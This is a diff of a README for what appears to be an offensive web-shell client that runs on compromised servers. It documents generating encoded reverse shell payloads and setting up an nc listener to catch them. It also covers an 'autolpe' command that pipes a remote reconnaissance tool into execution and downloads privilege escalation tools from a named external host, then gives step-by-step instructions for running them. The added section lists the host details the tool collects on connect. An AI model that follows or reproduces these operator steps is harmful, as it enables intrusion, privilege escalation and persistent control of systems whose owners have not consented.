@@ -54,27 +54,39 @@ Type 'help' for available commands
 | `download <file>` | Download file |
 | `upload <path>` | Upload file |
 | `reverse <IP> [LANG] [PORT] [encode]` | Create reverse shell payload |
-| `autolpe [py\|pl\|sh]` | Download & prepare LPE tools |
+| `autolpe [py\|pl\|sh]` | Run ReconL LPE tools |
+| `autolpe <lang> others` | Download other LPE tools and create runner |
 | `pwd`, `history`, `env` | System info |
 | `help` | Show all commands |
 
 ## LPE Auto (Local Privilege Escalation)
 
-The `autolpe` command downloads and prepares LPE tools from `https://mrls.wondtech.com/tools/lpe`
+### ReconL (Default)
 
-### Usage:
+The `autolpe` command runs ReconL (reconnaissance tool) directly via pipe:
+
 ```bash
-autolpe        # Creates autoLpe.py (Python runner)
-autolpe py     # Creates autoLpe.py
-autolpe pl     # Creates autoLpe.pl (Perl runner)
-autolpe sh     # Creates autoLpe.sh (Bash runner)
+autolpe              # Bash (default)
+autolpe perl         # Perl runner
+autolpe python       # Python runner
 ```
 
-### After download:
+### Other LPE Tools
+
+Download and prepare other LPE tools with language-specific runner:
+
+```bash
+autolpe bash others   # Creates autoLpe.sh
+autolpe perl others   # Creates autoLpe.pl
+autolpe python others # Creates autoLpe.py
+```
+
+### After download (others):
 1. Setup listener: `nc -lvnp <PORT>`
 2. Connect back: `reverse <YOUR_IP> <PORT>`
-3. Run: `python3 autoLpe.py list` (or perl/bash variant)
-4. Execute: `python3 autoLpe.py <tool_number>`
+3. Go to: `cd .mrls`
+4. Run: `bash autoLpe.sh list` (or perl/python variant)
+5. Execute: `bash autoLpe.sh <tool_number>`
 
 Tools are saved to `.mrls/lpe/` directory.
 
@@ -112,3 +124,15 @@ reverse xxx.xxx.xxx.xxx php encode   # Base64 encoded only
 - Reverse shell payloads (PHP, Python, Perl, Ruby, Bash, Netcat)
 - LPE tools auto-download and runner generation
 - Encoding support for payloads
+
+## Info Display
+
+On connect, displays:
+- Server IP & Hostname
+- Web Server & OS/Kernel & Architecture
+- User info (UID/GID)
+- Safe Mode status
+- cURL & Wget availability
+- Available databases with versions
+- Available languages & versions
+- Disabled PHP functions
